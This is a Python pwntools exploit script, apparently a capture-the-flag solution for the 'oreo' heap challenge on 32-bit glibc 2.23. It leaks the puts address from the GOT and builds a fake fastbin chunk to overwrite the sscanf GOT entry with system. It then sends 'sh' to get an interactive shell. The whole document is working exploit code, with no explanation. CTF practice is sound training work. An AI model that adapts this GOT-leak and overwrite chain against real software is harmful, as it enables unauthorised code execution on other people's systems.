from pwn import *
import sys, os
context.log_level = 'debug'
prog = './oreo'
elf = ELF(prog)
p = process(prog, stdin=PTY)
os.system("patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu10_i386/ld-2.23.so "+prog)
os.system("patchelf --set-rpath ./glibc-all-in-one/libs/2.23-0ubuntu10_i386 "+prog)
libc = ELF("./x86_libc.so.6")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()
puts_got = 0x804a248

def add(name, desc):
	p.sendlineafter("Action: ", '1')
	p.sendlineafter("name: ", name)
	p.sendlineafter("tion: ", desc)
def show():
	p.sendlineafter("Action: ", '2')
def free():
	p.sendlineafter("Action: ", '3')
def note(note):
	p.sendlineafter("Action: ", '4')
	p.sendlineafter("order: ", note)
def exp():
	add("aaa" + "bbbb"*6 + p32(puts_got),  'bbb')
	show()
	p.recvuntil("Description: ")
	p.recvuntil("Description: ")
	puts_addr = u32(p.recv(4))
	success(hex(puts_addr))
	for _ in range(0x3f):
		add('a', 'b')
	add("aaa" + "bbbb"*6 + p32(0x804a2a8),  'bbb')
	note(p64(0)*4+p32(0)+p32(0x41))
	free()
	add('a', p32(0x804a258))  #got_end==>sscanf
	system = 0x3ada0 + puts_addr - 0x5fca0
	note(p32(system))	
	p.sendline("sh")
	p.interactive()
if __name__ == '__main__':
	exp()
